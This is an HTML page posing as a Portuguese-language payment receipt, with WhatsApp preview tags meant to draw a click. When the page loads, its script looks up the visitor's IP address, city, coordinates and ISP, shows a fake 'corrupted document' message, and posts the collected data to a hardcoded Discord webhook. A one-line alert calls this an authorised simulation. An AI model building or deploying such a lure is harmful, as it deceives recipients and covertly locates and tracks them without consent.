<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Comprovante de Pagamento</title>

  <!-- Preview no WhatsApp -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="Comprovante de Pagamento">
  <meta property="og:description" content="Clique para visualizar o comprovante.">
  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgbTrDwJwDvi8MSIDu0LoS0szJrfuOdDahZCvU4vPkGqPTnxmL6qs1XdnH&s=10">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">

  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 40px;
      text-align: center;
      background-color: #fafafa;
    }
    #dados {
      margin-top: 30px;
      white-space: pre-wrap;
      color: #c00;
      font-family: monospace;
    }
  </style>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      alert("Esta é uma simulação de teste de segurança digital autorizada.");

      fetch("http://ip-api.com/json/")
        .then(res => res.json())
        .then(data => {
          const info = `
[SIMULAÇÃO DE CONSCIENTIZAÇÃO]
IP: ${data.query}
Cidade: ${data.city}
Região: ${data.regionName}
País: ${data.country}
Latitude: ${data.lat}
Longitude: ${data.lon}
Provedor: ${data.isp}
Data/Hora: ${new Date().toLocaleString()}
          `;

          document.getElementById("dados").innerText = info;

          fetch("https://discord.com/api/webhooks/1362586232504189071/Win7T8ZZKNfvhMnO44Mk533HD27XwQ270pUkLH7g0FhBt-Zcj6QN6F8LqEeTl28myVVM", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: info })
          });
        })
        .catch(err => {
          document.getElementById("dados").innerText = "Erro ao capturar IP.";
          console.error(err);
        });
    });
  </script>
</head>
<body>
  <h1>Documento corrompido</h1>
  <p>O arquivo não pôde ser carregado corretamente.</p>
  <div id="dados"></div>
</body>
</html>
